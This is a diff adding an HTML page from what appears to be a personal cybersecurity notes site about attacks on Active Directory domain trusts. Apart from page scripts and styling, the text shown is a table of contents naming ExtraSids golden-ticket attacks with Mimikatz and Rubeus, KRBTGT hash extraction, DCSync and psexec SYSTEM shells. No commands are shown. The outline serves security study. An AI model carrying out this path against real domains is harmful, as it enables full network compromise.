@@ -1,0 +1,1241 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Domain Trusts Attacks - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../../theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#ad-domain-trust-attacks">AD Domain Trust Attacks</a>
+<ul>
+<li><a href="#primer">Primer</a>
+<ul>
+<li><a href="#domain-trusts-overview">Domain Trusts Overview</a></li>
+<li><a href="#enumarating">Enumarating</a>
+<ul>
+<li><a href="#using-get-adtrust">Using Get-ADTrust</a></li>
+<li><a href="#checking-for-existing-trusts-using-get-domaintrust">Checking for Existing Trusts using Get-DomainTrust</a></li>
+<li><a href="#using-get-domaintrustmapping">Using Get-DomainTrustMapping</a></li>
+<li><a href="#checking-users-in-the-child-domain-using-get-domainuser">Checking Users in the Child Domain using Get-DomainUser</a></li>
+<li><a href="#using-netdom-to-query-domain-trust">Using netdom to query Domain Trust</a></li>
+<li><a href="#using-netdom-to-query-dcs">Using netdom to query DCs</a></li>
+<li><a href="#using-netdom-to-query-workstations-and-servers">Using netdom to query Workstations and Servers</a></li>
+<li><a href="#visualizing-trust-relationships-in-bloodhound">Visualizing Trust Relationships in BloodHound</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#attacking-domain-trusts-from-windows">Attacking Domain Trusts from Windows</a>
+<ul>
+<li><a href="#sid-history-primer">SID History Primer</a></li>
+<li><a href="#extrasids-attack---mimikatz">ExtraSids Attack - Mimikatz</a>
+<ul>
+<li><a href="#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz">Obtaining the KRBTGT Account's NT Hash using Mimikatz</a></li>
+<li><a href="#using-get-domainsid">Using Get-DomainSID</a></li>
+<li><a href="#obtaining-enterprise-admins-groups-sid-using-get-domaingroup">Obtaining Enterprise Admins Group's SID using Get-DomainGroup</a></li>
+<li><a href="#using-ls-to-confirm-no-access">Using ls to Confirm No Access</a></li>
+<li><a href="#creating-a-golden-ticket-with-mimikatz">Creating a Golden Ticket with Mimikatz</a></li>
+<li><a href="#confirming-a-kerberos-ticket-is-in-memory-using-klist">Confirming a Kerberos Ticket is in Memory Using klist</a></li>
+<li><a href="#listing-the-entire-c-drive-of-the-dc">Listing the Entire C: Drive of the DC</a></li>
+</ul>
+</li>
+<li><a href="#extrasids-attack---rubeus">ExtraSids Attack - Rubeus</a>
+<ul>
+<li><a href="#using-ls-to-confirm-no-access-before-running-rubeus">Using ls to Confirm No Access Before Running Rubeus</a></li>
+<li><a href="#creating-a-golden-ticket-using-rubeus">Creating a Golden Ticket using Rubeus</a></li>
+<li><a href="#confirming-the-ticket-is-in-memory-using-klist">Confirming the Ticket is in Memory Using klist</a></li>
+<li><a href="#performing-a-dcsync-attack">Performing a DCSync Attack</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#attacking-domain-trusts-from-linux">Attacking Domain Trusts from Linux</a>
+<ul>
+<li><a href="#performing-dcsync-with-secretsdumppy">Performing DCSync with secretsdump.py</a></li>
+<li><a href="#performing-sid-brute-forcing-using-lookupsidpy">Performing SID Brute Forcing using lookupsid.py</a></li>
+<li><a href="#looking-for-the-domain-sid">Looking for the Domain SID</a></li>
+<li><a href="#grabbing-the-domain-sid--attaching-to-enterprise-admins-rid">Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID</a></li>
+<li><a href="#constructing-a-golden-ticket-using-ticketerpy">Constructing a Golden Ticket using ticketer.py</a></li>
+<li><a href="#setting-the-krb5ccname-environment-variable">Setting the KRB5CCNAME Environment Variable</a></li>
+<li><a href="#getting-a-system-shell-using-impackets-psexecpy">Getting a SYSTEM shell using Impacket's psexec.py</a></li>
